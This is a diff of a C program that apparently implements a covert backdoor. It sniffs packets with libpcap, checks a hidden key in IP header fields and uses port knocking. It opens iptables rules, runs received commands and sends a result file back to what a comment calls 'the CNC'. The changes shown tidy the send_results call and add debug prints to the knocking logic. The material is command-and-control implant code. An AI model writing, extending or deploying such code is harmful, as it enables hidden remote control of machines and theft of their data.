@@ -18,9 +18,7 @@ int Packetcapture(char *filter, struct filter Filter){
         printf("pcap_open_live(): %s\n", errorbuffer);
         exit(0);
     }
-//the filter i create isnt working not sure why will fix later
     if(pcap_compile(interfaceinfo, &fp, filter, 0, netp) == -1){
-    //if(pcap_compile(interfaceinfo, &fp, "tcp and (port 8506 || port 8507 || port 8505)", 0, netp) == -1){
         perror("pcap_comile");
     }
 
@@ -90,7 +88,6 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
     }
 
 }
-
 
 bool CheckKey(u_char ip_tos, u_short ip_id, bool knock){
     if(knock){
@@ -212,15 +209,10 @@ void ParsePayload(struct filter *Filter, const u_char *payload, int len){
     iptables(Filter->targetip, "tcp", PORT, false, false);
     printf("COMMAND RECEIEVED \n");
     //sending the results back to the CNC
-    char *srcip = Filter->localip;
-    char *destip = Filter->targetip;
-    unsigned short sport = Filter->port_ushort[0];
-    unsigned short dport = Filter->port_ushort[1];
-    unsigned char data[BUFSIZE] = " ";
     printf("PORT KNOCKING\n");
     PortKnocking(*Filter, NULL, NULL, true);
     printf("SENDING RESULTS\n");
-    send_results(srcip, destip, sport, dport, RESULT_FILE);
+    send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE);
     iptables(Filter->targetip, "tcp", PORT, false, true);
     printf("\n");
     printf("\n");
@@ -247,8 +239,10 @@ void PrintFilter(struct filter Filter){
     printf("# of ports: %d \n", Filter.amount);
     printf("Port: %s\n", Filter.port[0]);
     printf("Port short: %hu\n", Filter.port_short[0]);
+    printf("Port unsigned short: %hu\n", Filter.port_ushort[0]);
     printf("Port: %s\n", Filter.port[1]);
     printf("Port short: %hu\n", Filter.port_short[1]);
+    printf("Port unsigned short: %hu\n", Filter.port_ushort[1]);
     printf("Target ip: %s\n", Filter.targetip);
     printf("Local ip: %s\n", Filter.localip);
 
@@ -304,6 +298,7 @@ void PortKnocking(struct filter Filter, const struct pcap_pkthdr* pkthdr, const 
 
         printf("PORT KNOCKING ON: %d\n", ntohs(tcp->th_dport));
         for(int k = 0; k < Filter.amount; k++){
+            printf("Filter.port_ushort = %hu compare and tcp->th_dport =%hu\n", Filter.port_ushort[k], tcp->th_dport);
             if(Filter.port_ushort[k] == tcp->th_dport){
                 Filter.pattern[k] = 1;
             }
